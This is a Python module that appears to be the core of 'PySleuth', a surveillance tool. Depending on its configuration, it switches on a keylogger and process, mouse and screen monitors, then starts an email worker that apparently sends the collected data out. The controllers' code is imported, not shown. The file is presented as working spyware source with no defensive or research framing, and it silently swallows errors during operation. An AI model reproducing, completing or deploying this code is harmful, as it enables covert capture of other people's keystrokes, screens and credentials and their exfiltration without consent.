from .configuration import ConfigHandler, loadConfig
from .controllers import KeyLoggerController
from .controllers import ProcessMntrController
from .controllers import MouseMntrController
from .controllers import ScreenMntrController
from .controllers import EmailController


class Struct:
    pass

class PySleuth:
    RUNNING = False

    def __init__(self):
        self.ctrls = Struct()

        self._initComponents()

        self.emailCtrl = None

    def start(self):
        self.emailCtrl = EmailController(self)
        self.emailCtrl.login()

        assert self.emailCtrl is not None

        try:
            self.emailCtrl.startWorker()
        except KeyboardInterrupt:
            print("\nUser abort!")
        except Exception as e:
            pass
        finally:
            self.emailCtrl.logout()
            self.RUNNING = False

    def _initComponents(self):
        components = ConfigHandler().getCfgRun()

        if components.getboolean("keylogger"):
            self._initKeylogger()

        if components.getboolean("process-monitor"):
            self._initProcessMonitor()

        if components.getboolean("mouse-monitor"):
            self._initMouseMonitor()

        if components.getboolean("screen-monitor"):
            self._initScreenMonitor()

    def _initKeylogger(self):
        setattr(self.ctrls, "keyloggerctrl", KeyLoggerController())

    def _initProcessMonitor(self):
        setattr(self.ctrls, "procMntrCtrl", ProcessMntrController())

    def _initMouseMonitor(self):
        setattr(self.ctrls, "mouseMntrCtrl", MouseMntrController())

    def _initScreenMonitor(self):
        setattr(self.ctrls, "screenMntrCtrl", ScreenMntrController())
